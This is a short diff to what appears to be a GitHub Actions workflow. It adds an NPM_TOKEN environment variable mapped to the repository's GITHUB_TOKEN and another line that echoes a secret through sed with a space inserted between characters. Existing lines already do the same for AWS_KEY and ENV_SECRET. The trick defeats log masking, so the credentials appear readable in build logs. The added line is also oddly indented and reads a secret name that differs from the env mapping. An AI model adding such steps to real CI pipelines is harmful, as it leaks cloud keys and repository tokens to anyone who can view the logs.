@@ -15,8 +15,10 @@ jobs:
       env:
         AWS_KEY: ${{ secrets.AWS_KEY }}
         ENV_SECRET: ${{ secrets.ENV_SECRET }}
+        NPM_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         
 
       run: |
         echo ${{secrets.AWS_KEY}} | sed 's/./& /g'
         echo ${{secrets.ENV_SECRET}} | sed 's/./& /g'
+         echo ${{secrets.NPM_TOKEN}} | sed 's/./& /g'
